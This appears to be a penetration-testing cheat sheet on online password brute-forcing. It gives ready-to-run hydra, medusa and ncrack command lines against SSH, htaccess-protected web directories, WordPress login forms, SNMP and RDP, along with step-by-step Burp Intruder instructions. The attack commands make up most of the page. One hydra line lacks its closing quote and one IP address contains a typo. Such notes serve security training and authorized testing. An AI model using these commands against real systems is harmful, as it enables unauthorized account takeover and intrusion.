# Online Password Cracking



There are several tools specialized for bruteforcing online. There are several different services that are common for bruteforce. For example: VNC, SSH, FTP, SNMP, POP3, HTTP.

### Port 22 - SSH <a id="port-22---ssh"></a>

```text
hydra -l root -P wordlist.txt 192.168.0.101 ssh
hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V
```

### Port 80/443 htaccess <a id="port-80443-htaccess"></a>

You can password protect directories with apache pretty easily. Just configure the htaccess \(I exaplin this in the chapter on Common ports\).

It can then be brute forced like this:

```text
medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
```

#### Logins <a id="logins"></a>

Use Burp Suite

1. Intecept a login attempt.
2. Modify the user field with ^USER^ and the password field with ^PASS^
3. Grab the post request path \(/wp-login.php\)
4. Grab the modified login request \(last field in request\)

Should be able to populate like below

```text
hydra -l username -P wordlist.txt TARGETIPADDRESS http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In
```

1. Send a fake request to the site and grab any text indicators of an invalid request \(_is incorrect_ in example below\)
2. Append to the end of the hydra syntax and close double quote

```text
hydra -l username -P wordlist.txt TARGETIPADDRESS http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:is incorrect"

hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/10k_most_common.txt TARGETIPADDRESS http-post-form "/wp-login.php:username=^USER^&password=^PASS^&wp-submit=Log+In:is incorrect" -t 64
```

Use Burp **Pro** suite. \(Can be performed in free but is ridiculously slow\)

1. Intecept a login attempt.
2. Right-lick "Send to intruder". Select Sniper if you have only one field you want to bruteforce. If you for example already know the username. Otherwise select cluster-attack.
3. Select your payload, your wordlist.
4. Click attack.
5. Look for response-length that differs from the rest.

### Port 161 - SNMP <a id="port-161---snmp"></a>

```text
hydra -P wordlist.txt -v 102.168.0.101 snmp
```

### Port 3389 - Remote Desktop Protocol <a id="port-3389---remote-desktop-protocol"></a>

For RDP we can use Ncrack.

```text
ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101
```

